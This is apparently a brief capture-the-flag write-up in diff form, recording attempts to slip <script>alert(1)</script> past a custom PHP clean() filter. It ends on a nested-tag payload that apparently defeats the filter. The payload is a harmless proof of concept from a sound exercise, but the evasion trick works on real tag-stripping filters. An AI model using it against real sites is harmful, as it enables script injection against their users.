@@ -1,0 +1,10 @@
+IceBreaker decided to write his very own clean() function for PHP. He has opened it up to anyone for 
+penetration testing.
+Your goal is to display the text <script>alert(1)</script> simulating a XSS injection.
+
+so when i wrote <script>alert(1)</script> this i got alert(1)
+
+so i wrote <scr</script>ipt>alert(1)</sc</script>ript> then i got <scr<>ipt>alert(1)</sc</>ript>
+
+so now t wrote this and got score
+<scrscriptipt>alert(1)</scscriptript>
